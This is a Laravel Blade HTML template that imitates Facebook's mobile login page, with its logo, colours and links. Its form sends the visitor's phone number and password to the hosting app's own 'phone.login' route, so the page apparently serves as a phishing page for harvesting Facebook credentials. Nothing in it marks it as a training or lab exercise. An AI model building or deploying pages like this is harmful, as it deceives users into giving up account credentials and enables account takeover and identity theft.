<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Facebook (Phone)</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #f0f2f5;
            font-family: 'Roboto', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .fb-container {
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(24,119,242,0.10);
            padding: 40px 28px 28px 28px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .fb-logo {
            color: #1877f2;
            font-size: 52px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 32px;
            letter-spacing: -2px;
        }
        .fb-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .fb-form input[type="text"],
        .fb-form input[type="password"] {
            width: 100%;
            box-sizing: border-box;
            padding: 12px 10px;
            border: 1px solid #e4e6eb;
            border-radius: 8px;
            font-size: 17px;
            background: #f7f8fa;
            transition: border-color 0.2s;
            margin: 0;
        }
        .fb-form input[type="text"]:focus,
        .fb-form input[type="password"]:focus {
            border-color: #1877f2;
            outline: none;
        }
        .fb-form button {
            width: 100%;
            background: #1877f2;
            color: #fff;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 19px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 8px;
            transition: background 0.2s;
        }
        .fb-form button:hover {
            background: #166fe5;
        }
        .fb-link {
            display: block;
            text-align: center;
            color: #1877f2;
            margin-bottom: 18px;
            font-size: 16px;
            font-weight: 500;
            text-decoration: none !important;
        }
        .fb-link:hover {
            text-decoration: none !important;
        }
        .fb-divider {
            border-top: 1px solid #e4e6eb;
            margin: 24px 0;
        }
        .fb-create {
            display: block;
            width: 100%;
            background: #42b72a;
            color: #fff;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 17px;
            font-weight: bold;
            text-align: center;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
            text-decoration: none !important;
        }
        .fb-create:hover {
            background: #36a420;
            text-decoration: none !important;
        }
        @media (max-width: 600px) {
            .fb-container {
                padding: 18px 6px 18px 6px;
                max-width: 98vw;
            }
            .fb-logo {
                font-size: 36px;
                margin-bottom: 18px;
            }
            .fb-form input[type="text"],
            .fb-form input[type="password"] {
                font-size: 15px;
                padding: 10px;
            }
            .fb-form button, .fb-create {
                font-size: 15px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="fb-container">
        <div class="fb-logo">facebook</div>
        <form class="fb-form" method="POST" action="{{ route('phone.login') }}">
            @csrf
            <input type="text" name="phone" placeholder="Phone number" required autofocus pattern="[0-9]+" inputmode="numeric">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <a class="fb-link" href="#">Forgotten password?</a>
        <div class="fb-divider"></div>
        <a class="fb-create" href="#">Create New Account</a>
    </div>
</body>
</html>
